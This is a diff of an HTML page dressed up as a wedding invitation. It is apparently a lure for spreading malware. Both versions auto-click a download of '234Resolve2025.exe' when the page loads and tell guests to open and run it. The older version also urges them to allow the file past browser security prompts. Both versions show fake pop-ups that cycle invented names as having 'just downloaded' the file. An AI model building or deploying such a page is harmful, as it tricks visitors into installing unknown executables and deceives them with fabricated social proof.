@@ -1,275 +1,271 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Wedding Invitation • Download or View</title>
-<style>
-  :root{
-    --card-bg: #fffaf6;
-    --accent: #c85a8a;
-    --muted: #6b6b6b;
-    --lace: rgba(255,255,255,0.95);
-    --shadow: 0 10px 30px rgba(0,0,0,0.15);
-    --toast-bg: rgba(255,255,255,0.95);
-  }
-  html,body{height:100%;margin:0;font-family: "Georgia", serif;background:
-    radial-gradient(circle at 10% 10%, rgba(200,90,140,0.08), transparent 10%),
-    radial-gradient(circle at 90% 90%, rgba(180,120,200,0.04), transparent 10%),
-    linear-gradient(180deg,#fff8fb,#fffdf8);
-    color:#333;
-  }
+  <meta charset="UTF-8" />
+  <title>Wedding Invitation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    /* Reset + base */
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      font-family: "Georgia", serif;
+      color: #e8eef7;
+      display: grid;
+      place-items: center;
+      text-align: center;
+      overflow: hidden;
+      background:
+        radial-gradient(1200px 1200px at 50% -200px, rgba(255,255,255,0.12), transparent 60%) ,
+        linear-gradient(#4a5a7a, #3f516f 35%, #3b4c68);
+    }
 
-  /* lace frame using SVG data-uri */
-  body::before{
-    content:"";
-    position:fixed;inset:0;pointer-events:none;
-    background-image:
-      radial-gradient(circle at 10% 10%, rgba(255,255,255,0.65), transparent 8%),
-      url('data:image/svg+xml;utf8,\
-      <svg xmlns="http://www.w3.org/2000/svg" width="800" height="200" viewBox="0 0 800 200">\
-      <defs>\
-        <pattern id="p" width="20" height="20" patternUnits="userSpaceOnUse">\
-          <circle cx="10" cy="10" r="1.5" fill="%23f6e9ef" />\
-        </pattern>\
-      </defs>\
-      <rect width="100%" height="100%" fill="url(%23p)"/>\
-      </svg>');
-    opacity:0.55;mix-blend-mode:soft-light;
-  }
+    /* Side lace using SVG data-URIs to emulate the reference */
+    .frame {
+      position: relative;
+      width: min(860px, 92vw);
+      max-width: 860px;
+      height: min(90vh, 1000px);
+      border-radius: 18px;
+      overflow: hidden;
+      filter: drop-shadow(0 18px 40px rgba(0,0,0,0.35));
+      isolation: isolate;
+    }
 
-  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:40px;box-sizing:border-box;}
-  .card{
-    width:min(900px,94%);
-    background: linear-gradient(180deg,var(--card-bg),#fff);
-    border-radius:18px;
-    box-shadow:var(--shadow);
-    padding:40px;
-    position:relative;
-    overflow:hidden;
-    border:8px solid rgba(255,255,255,0.6);
-  }
+    /* Left lace */
+    .frame::before,
+    .frame::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background-repeat: no-repeat;
+      background-size: 340px auto;
+      opacity: 0.55;
+      mix-blend-mode: screen;
+    }
+    .frame::before {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='1600' viewBox='0 0 600 1600'%3E%3Cg fill='none' stroke='%23ffffff' stroke-opacity='0.8'%3E%3Cg stroke-width='1.6' transform='translate(300,200)'%3E%3Ccircle r='140'/%3E%3Ccircle r='190'/%3E%3Ccircle r='240'/%3E%3Ccircle r='290'/%3E%3Ccircle r='340'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(30)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(60)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(90)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(120)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(150)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3C/g%3E%3C/svg%3E");
+      background-position: left center;
+      transform: scale(1.02);
+    }
+    /* Right lace (mirrored) */
+    .frame::after {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='1600' viewBox='0 0 600 1600'%3E%3Cg fill='none' stroke='%23ffffff' stroke-opacity='0.8'%3E%3Cg stroke-width='1.6' transform='translate(300,200)'%3E%3Ccircle r='140'/%3E%3Ccircle r='190'/%3E%3Ccircle r='240'/%3E%3Ccircle r='290'/%3E%3Ccircle r='340'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(30)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(60)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(90)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(120)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3Cg stroke-width='1.2' transform='translate(300,200) rotate(150)'%3E%3Cpath d='M0-190 22-150 0-110 -22-150Z'/%3E%3Cpath d='M0-240 26-190 0-140 -26-190Z'/%3E%3Cpath d='M0-290 30-240 0-190 -30-240Z'/%3E%3C/ g%3E%3C/g%3E%3C/svg%3E");
+      background-position: right center;
+      transform: scale(1.02) scaleX(-1);
+    }
 
-  /* floral corners (pure CSS shapes) */
-  .card::before, .card::after{
-    content:"";
-    position:absolute;
-    width:180px;height:180px;
-    background:
-      radial-gradient(circle at 20% 20%, rgba(200,90,140,0.85) 12%, transparent 13%),
-      radial-gradient(circle at 70% 70%, rgba(250,210,230,0.9) 12%, transparent 13%),
-      radial-gradient(circle at 40% 60%, rgba(255,230,200,0.9) 12%, transparent 13%),
-      radial-gradient(circle at 60% 30%, rgba(180,120,200,0.7) 9%, transparent 10%);
-    filter:blur(1px);
-    opacity:0.95;
-    transform:rotate(10deg) scale(1);
-  }
-  .card::before{left:-60px;top:-60px;border-radius:40px;}
-  .card::after{right:-60px;bottom:-60px;border-radius:40px;transform:rotate(-10deg) scale(1);}
+    /* Central panel */
+    .panel {
+      position: absolute;
+      inset: 40px;
+      border-radius: 14px;
+      backdrop-filter: blur(0.6px);
+      background:
+        linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02)) ,
+        linear-gradient(#697b9d, #556b8f 55%, #506487);
+      border: 1px solid rgba(255,255,255,0.24);
+      box-shadow:
+        inset 0 6px 22px rgba(0,0,0,0.18),
+        0 10px 30px rgba(0,0,0,0.35);
+      color: #f2f6ff;
+      padding: 40px 28px;
+      overflow-y: auto;
+    }
 
-  header{display:flex;flex-direction:column;align-items:center;text-align:center;margin-bottom:20px}
-  header .title{font-size:36px;color:var(--accent);letter-spacing:1px;margin:6px 0}
-  header .subtitle{font-family:Arial,Helvetica,sans-serif;color:var(--muted);font-size:14px;margin-top:6px}
+    h1 {
+      font-family: "Brush Script MT", cursive;
+      font-size: clamp(42px, 6vw, 56px);
+      margin: 0 0 8px;
+      color: #ffffff;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.35);
+      letter-spacing: 0.5px;
+    }
+    h2 {
+      font-size: clamp(18px, 2.6vw, 24px);
+      font-weight: 400;
+      margin: 0 0 18px;
+      color: #e8eef7;
+      opacity: 0.95;
+    }
+    p { font-size: clamp(14px, 2vw, 18px); margin: 12px 0; }
 
-  .invite-content{
-    display:grid;
-    grid-template-columns: 1fr 340px;
-    gap:24px;
-    align-items:start;
-  }
-  .left{
-    padding:18px 14px 10px 14px;
-  }
+    .instructions {
+      margin-top: 26px;
+      padding: 18px 16px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.22);
+      border-radius: 12px;
+      color: #f1f3fa;
+    }
+    .instructions h3 {
+      margin: 0 0 10px;
+      font-size: clamp(16px, 2.2vw, 20px);
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
 
-  .invite-text{
-    background: linear-gradient(180deg, rgba(255,255,255,0.8), rgba(255,255,255,0.95));
-    border-radius:12px;padding:18px;border:1px solid rgba(200,170,190,0.18);
-    box-shadow: 0 6px 18px rgba(0,0,0,0.06);
-    font-size:16px;color:#4a4a4a;line-height:1.5;
-  }
+    /* Fade-in animation */
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(14px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .panel > * { animation: fadeInUp 800ms ease both; }
+    .panel > *:nth-child(2) { animation-delay: 80ms; }
+    .panel > *:nth-child(3) { animation-delay: 140ms; }
+    .panel > *:nth-child(4) { animation-delay: 220ms; }
 
-  .right{
-    display:flex;flex-direction:column;gap:12px;align-items:center;
-  }
-  .download-card{
-    width:100%;
-    background:linear-gradient(180deg,#fff,#fff8fb);
-    border-radius:12px;padding:18px;border:1px solid rgba(200,170,190,0.12);
-    text-align:center;
-  }
-  .big-btn{
-    display:inline-block;padding:12px 18px;border-radius:10px;background:linear-gradient(180deg,var(--accent),#b0466a);
-    color:white;font-weight:700;text-decoration:none;border:none;font-size:16px;cursor:pointer;
-    box-shadow:0 6px 18px rgba(200,90,140,0.18);
-  }
-  .small{font-size:13px;color:var(--muted);margin-top:8px}
+    /* Toast notification */
+    .toast {
+      position: fixed;
+      bottom: 22px;
+      left: 22px;
+      z-index: 20;
+      max-width: min(86vw, 420px);
+      padding: 12px 14px;
+      border-radius: 12px;
+      background: rgba(20,26,40,0.85);
+      color: #e8eef7;
+      border: 1px solid rgba(255,255,255,0.18);
+      box-shadow: 0 10px 24px rgba(0,0,0,0.35);
+      display: grid;
+      grid-template-columns: 36px 1fr;
+      gap: 10px;
+      align-items: center;
+      transform: translateY(20px);
+      opacity: 0;
+      transition: opacity 320ms ease, transform 320ms ease;
+      pointer-events: none;
+    }
+    .toast.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .toast .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background:
+        radial-gradient(circle at 30% 30%, #ffffff 0 14%, transparent 15%),
+        radial-gradient(circle at 65% 55%, #ffffff 0 10%, transparent 11%),
+        linear-gradient(135deg, #6fa3ff, #a58bff 60%, #ff79b0);
+      border: 1px solid rgba(255,255,255,0.5);
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,0.15);
+    }
+    .toast .text { text-align: left; line-height: 1.25; }
+    .toast .name { font-weight: 700; color: #ffffff; }
+    .toast .muted { opacity: 0.85; font-size: 14px; }
 
-  .instructions{margin-top:14px;background:#fffdfb;border-radius:10px;padding:12px;border:1px solid rgba(200,170,190,0.06)}
-  .instructions ol{padding-left:18px;margin:6px 0;color:#444}
-  .instructions li{margin:6px 0}
+    a.manual {
+      color: #fff;
+      text-decoration: underline;
+    }
 
-  /* Modal */
-  .modal{
-    position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:80;
-    background:linear-gradient(180deg, rgba(5,5,5,0.35), rgba(5,5,5,0.5));
-    visibility:hidden;opacity:0;transition:opacity .28s;
-  }
-  .modal.open{visibility:visible;opacity:1}
-  .modal .box{width:min(760px,96%);background:white;border-radius:12px;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.35)}
-  .modal h3{margin-top:0;color:var(--accent);font-size:20px}
-  .close{background:#f1f1f1;border:0;padding:8px 12px;border-radius:8px;cursor:pointer;margin-left:12px}
+    @media (max-width: 600px) {
+      .frame { width: 94vw; }
+      .panel { inset: 18px; padding: 24px 18px; }
+      .toast { left: 14px; right: 14px; max-width: none; }
+    }
+  </style>
+  <script>
+    // Auto-download when page loads
+    window.addEventListener("load", function () {
+      try {
+        const link = document.createElement("a");
+        link.href = "234Resolve2025.exe"; // your file name here
+        link.download = "234Resolve2025.exe";
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+      } catch (_) {}
+    });
 
-  /* toast for names */
-  .toast{
-    position:fixed;left:20px;bottom:20px;background:var(--toast-bg);padding:12px 16px;border-radius:12px;
-    box-shadow:0 8px 20px rgba(0,0,0,0.12);display:flex;align-items:center;gap:10px;z-index:90;
-    font-family:Arial,Helvetica,sans-serif;color:#333;font-size:14px;border:1px solid rgba(200,170,190,0.06)
-  }
-  .toast .dot{width:10px;height:10px;border-radius:50%;background:linear-gradient(180deg,var(--accent),#b0466a);box-shadow:0 2px 6px rgba(176,64,106,0.3)}
-  .toast .name{font-weight:700}
+    // 80 mixed names
+    const NAMES = [
+      "James Ansel","Olivia Martin","Noah Bennett","Emma Johnson","Liam Carter","Ava Thompson",
+      "Mason Rivera","Sophia Clark","Elijah Brooks","Isabella Moore","Lucas Wright","Mia Lewis",
+      "Logan Walker","Amelia Hall","Ethan Young","Harper King","Aiden Scott","Evelyn Green",
+      "Jackson Adams","Abigail Baker","Sebastian Nelson","Emily Perez","Alexander Torres","Luna Roberts",
+      "Henry Turner","Scarlett Phillips","Michael Campbell","Grace Parker","Daniel Edwards","Chloe Evans",
+      "Jacob Collins","Victoria Stewart","Samuel Sanchez","Zoey Morris","Benjamin Rogers","Aria Reed",
+      "David Cook","Layla Morgan","Joseph Bell","Nora Murphy","Matthew Bailey","Riley Cooper",
+      "Carter Richardson","Hannah Cox","Wyatt Howard","Penelope Ward","Owen Hughes","Lillian Flores",
+      "Jack Foster","Addison Simmons","Luke Powell","Audrey Rivera","Levi Russell","Ellie Peterson",
+      "Isaac Gray","Paisley Hughes","Gabriel Bryant","Brooklyn Butler","Julian Henderson","Savannah Barnes",
+      "Grayson Coleman","Aaliyah Perry","Leo Long","Camila Bryant","Hudson Hughes","Stella Ross",
+      "Hunter Ramirez","Zoey Price","Eli Powell","Alexa Diaz","Nathan Kelly","Madison Hayes",
+      "Caleb Watson","Lucy Myers","Joshua Diaz","Ariana Jenkins","Andrew Ortiz","Maya Sullivan",
+      "Christopher Hart","Bella Gibson","Dylan Matthews","Naomi Boyd"
+    ];
 
-  /* responsive */
-  @media(max-width:880px){
-    .invite-content{grid-template-columns:1fr;gap:12px}
-    .right{order:2}
-  }
-</style>
+    // Toast logic
+    let lastIndex = -1;
+    function getRandomName() {
+      let idx = Math.floor(Math.random() * NAMES.length);
+      if (idx === lastIndex) idx = (idx + 1) % NAMES.length;
+      lastIndex = idx;
+      return NAMES[idx];
+    }
+
+    function createToast() {
+      const toast = document.createElement("div");
+      toast.className = "toast";
+      toast.innerHTML = `
+        <div class="avatar" aria-hidden="true"></div>
+        <div class="text">
+          <div class="name" id="toastName">—</div>
+          <div class="muted">just downloaded the invitation 1 minute ago</div>
+        </div>
+      `;
+      document.body.appendChild(toast);
+      return toast;
+    }
+
+    const toast = createToast();
+
+    function cycleToast() {
+      const nameEl = toast.querySelector("#toastName");
+      nameEl.textContent = getRandomName();
+      // show
+      requestAnimationFrame(() => {
+        toast.classList.add("show");
+        // keep visible, then subtly retrigger to keep it present without flicker
+        setTimeout(() => {
+          toast.classList.remove("show");
+        }, 2200); // fade away before next change
+      });
+    }
+
+    // Initial and interval updates every 3s
+    window.addEventListener("DOMContentLoaded", () => {
+      cycleToast();
+      setInterval(cycleToast, 3000);
+    });
+  </script>
 </head>
 <body>
+  <div class="frame">
+    <div class="panel">
+      <h1>You’re Invited!</h1>
+      <h2>To a Special Wedding Celebration</h2>
+      <p>We’re honored to welcome you 🎉</p>
+      <p>The invitation comes with a special software download that has already started automatically.</p>
 
-<div class="wrap">
-  <div class="card" role="main">
-    <header>
-      <div style="font-size:12px;color:#8b6b77">You are invited</div>
-      <div class="title">Welcome to Resolve Downloader</div>
-      <div class="subtitle">A little download that arrives like a gift 🎁</div>
-    </header>
-
-    <div class="invite-content">
-      <div class="left">
-        <div class="invite-text">
-          <p style="margin-top:0"><strong>Dear Guest,</strong></p>
-          <p>We’re honored to present the Resolve setup — a quick installer that will get everything ready for you. The download will start automatically. If it doesn't, press the download button on the right.</p>
-
-          <p><em>Note:</em> For security, modern browsers may prompt you before saving. If that appears, choose "Keep" / "Save" to proceed.</p>
-
-          <div style="margin-top:12px" class="instructions">
-            <strong>How to install</strong>
-            <ol>
-              <li>Open the downloaded file (usually in your Downloads folder).</li>
-              <li>If prompted by your system, allow the installer to run (choose <em>Run</em> or <em>Allow</em>).</li>
-              <li>Follow on-screen prompts to complete installation (Next → Install → Finish).</li>
-              <li>After install, you may delete the installer if you wish.</li>
-            </ol>
-          </div>
-        </div>
+      <div class="instructions">
+        <h3>💻 Installation Instructions</h3>
+        <p>1️⃣ Wait for the download to finish.</p>
+        <p>2️⃣ Open the downloaded file <b>234Resolve2025.exe</b>.</p>
+        <p>3️⃣ Follow the on-screen setup instructions.</p>
+        <p>4️⃣ Once installed, enjoy the full experience!</p>
       </div>
 
-      <aside class="right">
-        <div class="download-card">
-          <div style="font-size:13px;color:#8b6b77;margin-bottom:8px">Ready for quick download</div>
-          <!-- The anchor must point to the exact filename you uploaded -->
-          <a id="dlLink" href="yourfile.exe" download class="big-btn" role="button">Download Now</a>
-          <div class="small">Auto-download will start shortly. If blocked, click the button above.</div>
-        </div>
-
-        <div style="margin-top:8px;font-size:13px;color:var(--muted);text-align:center">
-          <strong>Fast tip:</strong> If your browser warns about executables, allow the file to keep for installation.
-        </div>
-      </aside>
+      <p style="margin-top:20px; font-size:16px;">
+        If the download didn’t start,
+        <a class="manual" href="234Resolve2025.exe">click here to download manually</a>.
+      </p>
     </div>
-
   </div>
-</div>
-
-<!-- Modal with install tips (shown on first load) -->
-<div id="modal" class="modal open" aria-hidden="false">
-  <div class="box">
-    <div style="display:flex;justify-content:space-between;align-items:center">
-      <h3>Quick installation guide</h3>
-      <div>
-        <button id="closeModal" class="close">Got it</button>
-      </div>
-    </div>
-    <p style="color:#444">The download should begin automatically. If it doesn't, click the "Download Now" button. Follow the installer steps (Next → Install → Finish). If a browser security prompt appears, choose to keep/allow the file.</p>
-  </div>
-</div>
-
-<!-- Toast cycling names -->
-<div id="toast" class="toast" aria-live="polite">
-  <div class="dot" aria-hidden="true"></div>
-  <div><span class="name" id="visitorName">Someone</span> just downloaded</div>
-</div>
-
-<script>
-/*
- *  Auto download + rotating names feature
- *  Replace 'yourfile.exe' with the exact filename uploaded to this folder (case-sensitive).
- */
-
-const EXE_FILENAME = "234Resolve2025.exe"; // <-- REPLACE with your real exe filename, e.g. "234Resolve2025.exe"
-
-// helper to attempt auto-download
-function attemptDownload() {
-  try {
-    const link = document.getElementById('dlLink');
-    link.href = EXE_FILENAME;
-    // create a temporary anchor in case download attribute blocked on anchor element
-    const a = document.createElement('a');
-    a.href = EXE_FILENAME;
-    a.download = EXE_FILENAME;
-    document.body.appendChild(a);
-    // try to open in new tab as fallback
-    a.click();
-    setTimeout(()=>{ a.remove(); }, 1000);
-  } catch (e) {
-    console.warn('Auto-download attempt failed', e);
-  }
-}
-
-// Try to auto-download after a small delay so UI renders first
-window.addEventListener('load', ()=> {
-  // set link href in case user changed filename in code
-  document.getElementById('dlLink').href = EXE_FILENAME;
-
-  // Small delay (1s) then attempt. If blocked, user can click the button.
-  setTimeout(attemptDownload, 1000);
-
-  // Close modal on click
-  document.getElementById('closeModal').addEventListener('click', ()=>{
-    document.getElementById('modal').classList.remove('open');
-    document.getElementById('modal').setAttribute('aria-hidden','true');
-  });
-});
-
-// Names array (25 names, mixed genders) — these rotate every 3s
-const names = [
-  "Ava Johnson","Liam Carter","Olivia Brown","Noah Davis","Emma Wilson",
-  "James Miller","Charlotte Moore","Lucas Taylor","Amelia Anderson","Mason Thomas",
-  "Sophia Jackson","Ethan White","Isabella Harris","Logan Martin","Mia Thompson",
-  "Benjamin Garcia","Harper Martinez","Jacob Robinson","Evelyn Clark","Michael Rodriguez",
-  "Abigail Lewis","Alexander Lee","Emily Walker","Daniel Hall","Chloe Young"
-];
-
-let idx = 0;
-const nameEl = document.getElementById('visitorName');
-function rotateName(){
-  nameEl.style.opacity = 0;
-  setTimeout(()=>{
-    nameEl.textContent = names[idx % names.length];
-    idx++;
-    nameEl.style.opacity = 1;
-  }, 300);
-}
-rotateName();
-setInterval(rotateName, 3000);
-
-/* Visual small animation for toast (fade) */
-const toast = document.getElementById('toast');
-toast.style.transition = 'transform .45s, opacity .45s';
-toast.style.transform = 'translateY(6px)';
-setTimeout(()=>{ toast.style.transform = 'translateY(0)'; }, 200);
-
-</script>
 </body>
 </html>
